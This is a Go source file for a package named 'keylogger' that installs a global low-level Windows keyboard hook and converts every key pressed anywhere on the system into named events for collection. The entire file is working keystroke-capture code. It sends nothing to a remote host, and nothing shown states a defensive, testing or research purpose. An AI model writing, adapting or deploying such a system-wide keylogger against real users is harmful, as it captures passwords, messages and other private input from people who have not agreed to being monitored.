package keylogger

import (
	"unsafe"

	"github.com/gonutz/w32/v2"
)

type windowsKeyLogger struct {
	hook    w32.HHOOK
	rawChan chan w32.DWORD
	events  chan KeyEvent
}

// New creates a new KeyLogger for Windows using low-level keyboard hooks.
func New() KeyLogger {
	return &windowsKeyLogger{
		rawChan: make(chan w32.DWORD, 100),
		events:  make(chan KeyEvent, 100),
	}
}

func (k *windowsKeyLogger) Start() error {
	go k.processLoop()

	hk := w32.SetWindowsHookEx(w32.WH_KEYBOARD_LL, k.keyboardCallback, 0, 0)
	k.hook = hk

	// It's required to "pump" the Windows message loop for the hook to work.
	go func() {
		var msg w32.MSG
		for w32.GetMessage(&msg, 0, 0, 0) != 0 {
		}
	}()

	return nil
}

func (k *windowsKeyLogger) Events() <-chan KeyEvent {
	return k.events
}

func (k *windowsKeyLogger) Stop() error {
	if k.hook != 0 {
		w32.UnhookWindowsHookEx(k.hook)
	}
	return nil
}

func (k *windowsKeyLogger) keyboardCallback(nCode int, wparam w32.WPARAM, lParam w32.LPARAM) w32.LRESULT {
	if nCode == 0 && wparam == w32.WM_KEYDOWN {
		ks := (*w32.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		select {
		case k.rawChan <- ks.VkCode:
		default:
		}
	}
	return w32.CallNextHookEx(k.hook, nCode, wparam, lParam)
}

func (k *windowsKeyLogger) processLoop() {
	for vk := range k.rawChan {
		ev := mapVKToKeyEvent(vk)
		if ev.Name != "" || ev.IsReturn || ev.IsBack {
			select {
			case k.events <- ev:
			default:
			}
		}
	}
}

func mapVKToKeyEvent(vk w32.DWORD) KeyEvent {
	switch vk {
	case w32.VK_RETURN:
		return KeyEvent{IsReturn: true}
	case w32.VK_BACK:
		return KeyEvent{IsBack: true}
	case w32.VK_CONTROL:
		return KeyEvent{Name: "[Ctrl]"}
	case w32.VK_TAB:
		return KeyEvent{Name: "[Tab]"}
	case w32.VK_SHIFT:
		return KeyEvent{Name: "[Shift]"}
	case w32.VK_MENU:
		return KeyEvent{Name: "[Alt]"}
	case w32.VK_CAPITAL:
		return KeyEvent{Name: "[CapsLock]"}
	case w32.VK_ESCAPE:
		return KeyEvent{Name: "[Esc]"}
	case w32.VK_SPACE:
		return KeyEvent{Name: " "}
	case w32.VK_PRIOR:
		return KeyEvent{Name: "[PageUp]"}
	case w32.VK_NEXT:
		return KeyEvent{Name: "[PageDown]"}
	case w32.VK_END:
		return KeyEvent{Name: "[End]"}
	case w32.VK_HOME:
		return KeyEvent{Name: "[Home]"}
	case w32.VK_LEFT:
		return KeyEvent{Name: "[Left]"}
	case w32.VK_UP:
		return KeyEvent{Name: "[Up]"}
	case w32.VK_RIGHT:
		return KeyEvent{Name: "[Right]"}
	case w32.VK_DOWN:
		return KeyEvent{Name: "[Down]"}
	case w32.VK_SELECT:
		return KeyEvent{Name: "[Select]"}
	case w32.VK_PRINT:
		return KeyEvent{Name: "[Print]"}
	case w32.VK_EXECUTE:
		return KeyEvent{Name: "[Execute]"}
	case w32.VK_SNAPSHOT:
		return KeyEvent{Name: "[PrintScreen]"}
	case w32.VK_INSERT:
		return KeyEvent{Name: "[Insert]"}
	case w32.VK_DELETE:
		return KeyEvent{Name: "[Delete]"}
	case w32.VK_HELP:
		return KeyEvent{Name: "[Help]"}
	case w32.VK_LWIN:
		return KeyEvent{Name: "[LeftWindows]"}
	case w32.VK_RWIN:
		return KeyEvent{Name: "[RightWindows]"}
	case w32.VK_APPS:
		return KeyEvent{Name: "[Applications]"}
	case w32.VK_SLEEP:
		return KeyEvent{Name: "[Sleep]"}
	case w32.VK_NUMPAD0:
		return KeyEvent{Name: "[Pad 0]"}
	case w32.VK_NUMPAD1:
		return KeyEvent{Name: "[Pad 1]"}
	case w32.VK_NUMPAD2:
		return KeyEvent{Name: "[Pad 2]"}
	case w32.VK_NUMPAD3:
		return KeyEvent{Name: "[Pad 3]"}
	case w32.VK_NUMPAD4:
		return KeyEvent{Name: "[Pad 4]"}
	case w32.VK_NUMPAD5:
		return KeyEvent{Name: "[Pad 5]"}
	case w32.VK_NUMPAD6:
		return KeyEvent{Name: "[Pad 6]"}
	case w32.VK_NUMPAD7:
		return KeyEvent{Name: "[Pad 7]"}
	case w32.VK_NUMPAD8:
		return KeyEvent{Name: "[Pad 8]"}
	case w32.VK_NUMPAD9:
		return KeyEvent{Name: "[Pad 9]"}
	case w32.VK_MULTIPLY:
		return KeyEvent{Name: "*"}
	case w32.VK_ADD:
		return KeyEvent{Name: "+"}
	case w32.VK_SEPARATOR:
		return KeyEvent{Name: "[Separator]"}
	case w32.VK_SUBTRACT:
		return KeyEvent{Name: "-"}
	case w32.VK_DECIMAL:
		return KeyEvent{Name: "."}
	case w32.VK_DIVIDE:
		return KeyEvent{Name: "[Divide]"}
	case w32.VK_F1:
		return KeyEvent{Name: "[F1]"}
	case w32.VK_F2:
		return KeyEvent{Name: "[F2]"}
	case w32.VK_F3:
		return KeyEvent{Name: "[F3]"}
	case w32.VK_F4:
		return KeyEvent{Name: "[F4]"}
	case w32.VK_F5:
		return KeyEvent{Name: "[F5]"}
	case w32.VK_F6:
		return KeyEvent{Name: "[F6]"}
	case w32.VK_F7:
		return KeyEvent{Name: "[F7]"}
	case w32.VK_F8:
		return KeyEvent{Name: "[F8]"}
	case w32.VK_F9:
		return KeyEvent{Name: "[F9]"}
	case w32.VK_F10:
		return KeyEvent{Name: "[F10]"}
	case w32.VK_F11:
		return KeyEvent{Name: "[F11]"}
	case w32.VK_F12:
		return KeyEvent{Name: "[F12]"}
	case w32.VK_NUMLOCK:
		return KeyEvent{Name: "[NumLock]"}
	case w32.VK_SCROLL:
		return KeyEvent{Name: "[ScrollLock]"}
	case w32.VK_LSHIFT:
		return KeyEvent{Name: "[LeftShift]"}
	case w32.VK_RSHIFT:
		return KeyEvent{Name: "[RightShift]"}
	case w32.VK_LCONTROL:
		return KeyEvent{Name: "[LeftCtrl]"}
	case w32.VK_RCONTROL:
		return KeyEvent{Name: "[RightCtrl]"}
	case w32.VK_LMENU:
		return KeyEvent{Name: "[LeftAlt]"}
	case w32.VK_RMENU:
		return KeyEvent{Name: "[RightAlt]"}
	case w32.VK_OEM_1:
		return KeyEvent{Name: ";"}
	case w32.VK_OEM_2:
		return KeyEvent{Name: "/"}
	case w32.VK_OEM_3:
		return KeyEvent{Name: "`"}
	case w32.VK_OEM_4:
		return KeyEvent{Name: "["}
	case w32.VK_OEM_5:
		return KeyEvent{Name: "\\"}
	case w32.VK_OEM_6:
		return KeyEvent{Name: "]"}
	case w32.VK_OEM_7:
		return KeyEvent{Name: "'"}
	case w32.VK_OEM_PERIOD:
		return KeyEvent{Name: "."}
	case 0x30:
		return KeyEvent{Name: "0"}
	case 0x31:
		return KeyEvent{Name: "1"}
	case 0x32:
		return KeyEvent{Name: "2"}
	case 0x33:
		return KeyEvent{Name: "3"}
	case 0x34:
		return KeyEvent{Name: "4"}
	case 0x35:
		return KeyEvent{Name: "5"}
	case 0x36:
		return KeyEvent{Name: "6"}
	case 0x37:
		return KeyEvent{Name: "7"}
	case 0x38:
		return KeyEvent{Name: "8"}
	case 0x39:
		return KeyEvent{Name: "9"}
	case 0x41:
		return KeyEvent{Name: "a"}
	case 0x42:
		return KeyEvent{Name: "b"}
	case 0x43:
		return KeyEvent{Name: "c"}
	case 0x44:
		return KeyEvent{Name: "d"}
	case 0x45:
		return KeyEvent{Name: "e"}
	case 0x46:
		return KeyEvent{Name: "f"}
	case 0x47:
		return KeyEvent{Name: "g"}
	case 0x48:
		return KeyEvent{Name: "h"}
	case 0x49:
		return KeyEvent{Name: "i"}
	case 0x4A:
		return KeyEvent{Name: "j"}
	case 0x4B:
		return KeyEvent{Name: "k"}
	case 0x4C:
		return KeyEvent{Name: "l"}
	case 0x4D:
		return KeyEvent{Name: "m"}
	case 0x4E:
		return KeyEvent{Name: "n"}
	case 0x4F:
		return KeyEvent{Name: "o"}
	case 0x50:
		return KeyEvent{Name: "p"}
	case 0x51:
		return KeyEvent{Name: "q"}
	case 0x52:
		return KeyEvent{Name: "r"}
	case 0x53:
		return KeyEvent{Name: "s"}
	case 0x54:
		return KeyEvent{Name: "t"}
	case 0x55:
		return KeyEvent{Name: "u"}
	case 0x56:
		return KeyEvent{Name: "v"}
	case 0x57:
		return KeyEvent{Name: "w"}
	case 0x58:
		return KeyEvent{Name: "x"}
	case 0x59:
		return KeyEvent{Name: "y"}
	case 0x5A:
		return KeyEvent{Name: "z"}
	default:
		return KeyEvent{}
	}
}
